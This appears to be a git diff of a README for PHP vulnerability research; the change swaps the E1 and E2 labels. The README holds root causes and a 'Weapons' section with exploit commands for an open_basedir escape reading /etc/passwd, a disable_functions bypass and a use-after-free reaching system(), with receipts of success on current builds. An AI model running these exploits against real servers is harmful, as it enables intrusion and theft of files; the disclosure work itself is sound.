@@ -12,8 +12,8 @@ Independently verified, receipt-backed security research against the current PHP
 
 | # | Finding | CVSS | Vector | Result | Folder |
 |:-:|---------|:----:|--------|--------|--------|
-| E1 | Cross-pool opcache function-dispatch confusion | **7.9** | `AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` | `disable_functions` bypass with OS command execution, 12/12 across all three tips + Debian package build; realistic cPanel-style list → arbitrary file read | `crosspool/` |
-| E2 | `open_basedir` relative-entry expansion escape | **9.2** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` | Full filesystem access, all three tips (CLI `-d` shape + real FPM pool demo) | `basedir-relentry/` |
+| E1 | `open_basedir` relative-entry expansion escape | **9.2** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` | Full filesystem access, all three tips (CLI `-d` shape + real FPM pool demo) | `basedir-relentry/` |
+| E2 | Cross-pool opcache function-dispatch confusion | **7.9** | `AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` | `disable_functions` bypass with OS command execution, 12/12 across all three tips + Debian package build; realistic cPanel-style list → arbitrary file read | `crosspool/` |
 | E3 | user-filter UAF → `write_property` hijack → `system()` | **7.5** | `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` | 6/6 on stock release builds, `system()` marker ×3 tips, `abort()` exit 134 ×3 tips; default Zend MM, FFI off | `userfilter-uaf/` |
 
 **CVSS 3.1 computed from formula.** Vector arithmetic: E = 8.22·AV·AC·PR·UI; ISS = 1−(1−C)(1−I)(1−A); Impact(S:U) = 6.42·ISS, Impact(S:C) = 7.52·(ISS−0.029)−3.25·(ISS−0.02)^15; Base = Roundup₁₀(Impact+E).
@@ -22,12 +22,12 @@ Independently verified, receipt-backed security research against the current PHP
 
 ## Complete Vulnerability Inventory, all 47 findings, each with its PoC
 
-Corpus: confirmed-findings research engagement (original proofs vs 8.5.12/8.4.27), re-verified against the 2026-11-19 tips. Rows E1/E3/E2 correspond to corpus findings #37/#7/#49, see the escalated table above and their deep-dive folders.
+Corpus: confirmed-findings research engagement (original proofs vs 8.5.12/8.4.27), re-verified against the 2026-11-19 tips. Rows E1/E2/E3 correspond to corpus findings #49/#37/#7, see the escalated table above and their deep-dive folders.
 
 | # | Finding | Sev | Component | Status on 11-19 tips | PoC |
 |:-:|---------|:---:|-----------|----------------------|:---:|
-| 37 | FPM pools that share opcache run internal calls against the wrong disable_functions table | **→ E1** | FPM/OPcache | 🔴 Still present, fresh-verified 11-20 | crosspool/ |
-| 49 | open_basedir escape: getcwd failure stores literal ../ | **→ E2** | main/fopen_wrappers.c open_basedir | 🔴 Still present, fresh-verified 11-20 | basedir-relentry/ |
+| 37 | FPM pools that share opcache run internal calls against the wrong disable_functions table | **→ E2** | FPM/OPcache | 🔴 Still present, fresh-verified 11-20 | crosspool/ |
+| 49 | open_basedir escape: getcwd failure stores literal ../ | **→ E1** | main/fopen_wrappers.c open_basedir | 🔴 Still present, fresh-verified 11-20 | basedir-relentry/ |
 | 1 | Failed unserialize leaves Exception::$trace as an object; getTraceAsString walks it as a HashTable | **high** | unserialize | 🔴 Still present, fresh-verified 11-20 | highs/ |
 | 6 | quoted-printable encode reads past the chunk when line-break-chars starts with SP or TAB | **high** | ext/standard convert.quoted-printable-en | 🔴 Still present, fresh-verified 11-20 | highs/ |
 | 7 | stream_filter_remove from inside filter() frees the active user filter and use-after-frees it | **→ E3** | ext/standard user filters | 🔴 Still present, fresh-verified 11-20 | userfilter-uaf/ |
@@ -82,8 +82,8 @@ Corpus: confirmed-findings research engagement (original proofs vs 8.5.12/8.4.27
 
 ### Fresh-verification notes
 
-- **#37 / E1**, the underlying mechanism is cross-pool function-dispatch confusion: deterministic per (build, config, script), the disable-list composition selects the invoked builtin, and the map is enumerable offline via a `get_defined_functions()` table-order diff.
-- **#49 / E2**, live on every tip; verified with the full PoC harness shapes (prebuilt directory tree, exact launch flags, FPM pool configuration).
+- **#37 / E2**, the underlying mechanism is cross-pool function-dispatch confusion: deterministic per (build, config, script), the disable-list composition selects the invoked builtin, and the map is enumerable offline via a `get_defined_functions()` table-order diff.
+- **#49 / E1**, live on every tip; verified with the full PoC harness shapes (prebuilt directory tree, exact launch flags, FPM pool configuration).
 - **#7 / E3**, escalated to full `system()` execution on all three tips, stock release builds.
 - **#1**, SIGSEGV exit 139 on 8.4.28 + 8.5.13; clean exit 0 on 8.6.0 (unmodified corpus PoC).
 - **#6**, live on 8.4.28 + 8.5.13 (16-byte in → 15-byte out, trailing SP deleted); 8.6.0 keeps the SP with this shape.
@@ -93,9 +93,9 @@ Corpus: confirmed-findings research engagement (original proofs vs 8.5.12/8.4.27
 
 ## Root causes (escalated findings)
 
-- **E1:** `zend_disable_functions()` (`Zend/zend_API.c:3682`) deletes entries then `zend_hash_rehash()` compacts the table, while opcache's SHM-shared call slots and the `ZEND_INIT_FCALL` type-specialized handler (`Zend/zend_vm_def.h:4034`) resolve via a baked bucket index into the executing pool's table with no name validation; the plain handler's null check is a release-elided `ZEND_ASSERT`. Pools differing in `disable_functions` invoke wrong builtins with attacker-controlled arguments.
-- **E1 caveat:** `ini_get('disable_functions')` is constant-folded at compile, a pool executing another pool's cached script prints the compiling pool's value; not evidence of executing-pool config.
-- **E2:** `open_basedir` accepts relative entries, expanded once against the daemon's startup cwd; php-fpm masters launch from `/`. Runtime `ini_set` widen stores a literal `../` but does not itself escape (climb stalls at the jail boundary), the live vector is the config-level relative entry.
+- **E2:** `zend_disable_functions()` (`Zend/zend_API.c:3682`) deletes entries then `zend_hash_rehash()` compacts the table, while opcache's SHM-shared call slots and the `ZEND_INIT_FCALL` type-specialized handler (`Zend/zend_vm_def.h:4034`) resolve via a baked bucket index into the executing pool's table with no name validation; the plain handler's null check is a release-elided `ZEND_ASSERT`. Pools differing in `disable_functions` invoke wrong builtins with attacker-controlled arguments.
+- **E2 caveat:** `ini_get('disable_functions')` is constant-folded at compile, a pool executing another pool's cached script prints the compiling pool's value; not evidence of executing-pool config.
+- **E1:** `open_basedir` accepts relative entries, expanded once against the daemon's startup cwd; php-fpm masters launch from `/`. Runtime `ini_set` widen stores a literal `../` but does not itself escape (climb stalls at the jail boundary), the live vector is the config-level relative entry.
 - **E3:** `php_user_filter::filter()` calling `stream_filter_remove()` on itself frees the filter while `ext/standard/user_filters.c:225` runs `zend_update_property_null` over the freed abstract post-callback. The wrapper reads the abstract slot as a direct `zend_object*`, dispatches `handlers->write_property` (+0x28). Full-bin string reclaim + `/proc/self/mem` slot patch + kept obj-host string → `system(cmd)`. Patch only the abstract slot, `abort()` survives a corrupted heap, `system()` does not.
 
 ## Weapons
@@ -111,12 +111,12 @@ Corpus: confirmed-findings research engagement (original proofs vs 8.5.12/8.4.27
 | `pocs/f1…f52` | All 47 corpus PoCs, as shipped |
 
 ```
-# E1 (RCE matrix, per tip)
+# E2 (RCE matrix, per tip)
 docker run -d --name c2 -p 19001:9001 -p 19002:9002 -v $PWD:/www -v $PWD/conf:/cconf:ro \
   php:8.4-fpm php-fpm -F -y /cconf/fpm-multi1.conf -d opcache.enable=1 -d opcache.file_update_protection=0
 bash crosspool/poc/run_multi1.sh 8.4   # expect: marker written by disabled pool A
 
-# E2 (CLI shape)
+# E1 (CLI shape)
 php -n -d open_basedir=/tmp/f49/jail:../ basedir-relentry/poc/poc-f49d.php   # CWD=/ + /etc/passwd read
 
 # E3
@@ -128,13 +128,13 @@ docker run --rm -v $PWD:/h -e F7_TARGET=system -e F7_CMD="touch /tmp/PWNED" \
 
 | Target | Chain | Receipt |
 |--------|-------|---------|
-| php:8.4-fpm (8.4.28, official) | E1 `{exec,shell_exec}` | **marker by disabled pool A, 3/3** |
-| php:8.5-fpm (8.5.13, official) | E1 | **marker 3/3** |
-| php:8.6-fpm (8.6.0, official) | E1 | **marker 3/3** |
-| Debian trixie php-fpm8.4 8.4.28-1 (distro build) | E1 | **marker 3/3** |
-| php:8.4-fpm, 10-name cPanel-style disable list | E1 `passthru()` → `readfile()` | **full `/etc/passwd` dump through pool A response** |
-| php:8.4/8.5/8.6-cli | E2 `jail:../` climb | **CWD=/, outside file + `/etc/passwd` + include executed** |
-| php:8.4-fpm pool `open_basedir=/www:../` | E2 fpm shape | `/etc/passwd` + `/etc/hostname` through response |
+| php:8.4-fpm (8.4.28, official) | E2 `{exec,shell_exec}` | **marker by disabled pool A, 3/3** |
+| php:8.5-fpm (8.5.13, official) | E2 | **marker 3/3** |
+| php:8.6-fpm (8.6.0, official) | E2 | **marker 3/3** |
+| Debian trixie php-fpm8.4 8.4.28-1 (distro build) | E2 | **marker 3/3** |
+| php:8.4-fpm, 10-name cPanel-style disable list | E2 `passthru()` → `readfile()` | **full `/etc/passwd` dump through pool A response** |
+| php:8.4/8.5/8.6-cli | E1 `jail:../` climb | **CWD=/, outside file + `/etc/passwd` + include executed** |
+| php:8.4-fpm pool `open_basedir=/www:../` | E1 fpm shape | `/etc/passwd` + `/etc/hostname` through response |
 | php:8.4/8.5/8.6-cli (stock, default MM, FFI off) | E3 `system()` | **marker 3/3** |
 | php:8.4/8.5/8.6-cli | E3 `abort()` | **exit 134, 3/3** |
 | php:8.4/8.5-cli | #1 Exception-trace confusion | SIGSEGV exit 139 (heap addresses as frame indexes) |
